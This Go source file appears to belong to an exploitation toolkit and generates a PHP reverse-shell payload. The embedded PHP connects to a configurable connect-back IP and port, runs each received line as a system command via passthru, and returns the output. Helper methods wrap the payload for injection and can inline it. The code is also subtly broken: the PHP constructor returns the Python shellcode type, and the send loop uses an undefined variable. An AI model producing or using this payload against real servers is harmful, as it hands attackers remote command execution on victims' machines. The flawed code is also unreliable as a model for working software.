package shellcode

import "fmt"

type PHPShellCode struct {
    *ShellCodeBase
}

func NewPHPShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *PyShellCode {
    base := NewShellCodeBase(osTarget, osTargetArch, connectBackIP, connectBackPort, badChars, prefix, suffix)
    return &PyShellCode{base}
}

func (psc *PHPShellCode) GetPHPInfo() string {
    phpcode := "<?php phpinfo(); ?>"
    return phpcode
}

func (psc *PHPShellCode) GetPHPCode() string {
    if psc.IP == "" || psc.Port == 0 {
        return ""
    }

    phpcode := `
        $address="{{LOCALHOST}}";
        $port={{LOCALPORT}};
        $buff_size=2048;
        $timeout=120;
        $sock=fsockopen($address,$port) or die("Cannot create a socket");
        while ($read=fgets($sock,$buff_size)) {
            $out="";
            if ($read) {
                if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
                    break;
                }
                ob_start();
                passthru($read);
                $out=ob_get_contents();
                ob_end_clean();
            }
            $length=strlen($out);
            while (1) {
                $sent=fwrite($sock,$out,$length);
                if ($sent===false) {
                    break;
                }
                if ($sent<$length) {
                    $st=substr($st,$sent);
                    $length-=$sent;
                } else {
                    break;
                }
            }
        }
        fclose($sock);
        `
    phpcode = psc.GenShellCode(phpcode)
    return fmt.Sprintf("%s%s%s", psc.Prefix, phpcode, psc.Suffix)
}

func (psc *PHPShellCode) GetShellCode(inline bool) string {
    phpShell := psc.GetPHPCode()
    if inline {
       phpShell = psc.MakeInline(phpShell) 
    }
    return phpShell
}

